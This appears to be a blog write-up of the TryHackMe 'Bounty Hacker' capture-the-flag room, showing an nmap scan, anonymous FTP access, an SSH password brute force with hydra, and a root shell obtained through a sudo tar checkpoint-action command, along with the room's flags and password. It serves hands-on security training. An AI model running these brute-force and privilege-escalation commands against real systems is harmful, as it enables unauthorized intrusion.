---
title: "[CTF] Tryhackme - Bounty Hacker "
date: 2024-09-18 12:00:00 -500 
categories: [CTF - Tryhackme, Bounty Hacker]
tags: [ctf,exploit,flags,tryhackme,pentesting]
author: Christoph K
---
[TryHackMe- Bounty Hunter ](https://tryhackme.com/r/room/cowboyhacker)


# Questions:

1. Find open ports on the machine
2. Who wrote the task list? 
3. What service can you bruteforce with the text file found?
4. What is the users password? 
5. user.txt
6. root.txt



### Find open ports on the machine & Who wrote the task list? 


Like in the most of the CTF challenges, lets scan the target via `nmap`.


```bash

└─$ nmap -sV $ip
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-19 17:54 CST
Nmap scan report for 10.10.112.254
Host is up (0.22s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.23 seconds


```

We have 3 open ports here - ports `21, 22, 80 `

First I would try to discover as much as possible. Lets check the webpage and the ftp port.

```html
<h3>Spike:"..Oh look you're finally up. It's about time, 3 more minutes and you were going out with the garbage."</h3>

<hr>

<h3>Jet:"Now you told Spike here you can hack any computer in the system. We'd let Ed do it but we need her working on something else and you were getting real bold in that bar back there. Now take a look around and see if you can get that root the system and don't ask any questions you know you don't need the answer to, if you're lucky I'll even make you some bell peppers and beef."</h3>

<hr>

<h3>Ed:"I'm Ed. You should have access to the device they are talking about on your computer. Edward and Ein will be on the main deck if you need us!"</h3>
```



There was no helpful clue for me on the webpage so lets move to ftp. As always with `ftp` we try  `anonymous`first. And we get a `230` - Login successful.

```bash

┌──(admin㉿PREDATOR-01)-[~]
└─$ ftp $ip
Connected to 10.10.112.254.
220 (vsFTPd 3.0.3)
Name (10.10.112.254:admin): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

Lets see what we got here.
```bash
ftp> dir
229 Entering Extended Passive Mode (|||43549|)
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> get task.txt
local: task.txt remote: task.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |**************************************************************************************************************************************|    68      922.30 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.30 KiB/s)
```

And in the `task.txt` is :
```
└─$ cat task.txt
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

We have our author from the file.



Answer:`lin`

###  What service can you bruteforce with the text file found?

With an `user` we can try to bruteforce the password with `hydra` on `ssh`. 


Answer: `ssh`


### What is the users password?

Lets `bruteforce`the password with `hydra`! We had a file called `locks.txt` on the ftp server. It looks like potential passwords in there, so we use it as `wordlist`.



```bash

─$ head locks.txt
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
```

Lets bruteforce :-) 
```bash


└─$ hydra -l lin -P locks.txt ssh://$ip
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-19 18:53:02
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.112.254:22/
[22][ssh] host: 10.10.112.254   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-19 18:53:08

```

And we found our password.

Password: `RedDr4gonSynd1cat3`



### user.txt

With our fresh bruteforced credentials we login into `ssh` and search for the `user.txt`

```bash

┌──(admin㉿PREDATOR-01)-[~]
└─$ ssh lin@$ip -p 22
The authenticity of host '10.10.112.254 (10.10.112.254)' can't be established.
ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.112.254' (ED25519) to the list of known hosts.
lin@10.10.112.254's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ cat user.txt
THM{CR1M3_SyNd1C4T3}

```

Very nice, we have our `user flag`.


Answer: `THM{CR1M3_SyNd1C4T3}`


 

### root.txt



We check again, what we can do as our user with `sudo -l`

It shows us, that `lin` can use `tar`with privileged permissions. We can use that to spawn an elevated shell.

```bash
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin:
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

https://gtfobins.github.io/gtfobins/tar/

We use the command from `gtfobins` 

`sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`


```bash
lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# cd /root
# ls
root.txt
# cat root.txt
THM{80UN7Y_h4cK3r}
```

And we got it:

Answer: `THM{80UN7Y_h4cK3r}`

## Thoughts:
This CTF is very beginner friendly and I liked it very much. I think it could be better if it had also some web vulnerabilities.

What did we learn?
- using `nmap` for scan open ports and versions
- using `ftp` for browsing in files.
- using `hydra` to bruteforce
- using `tar` to spawn an interactive shell





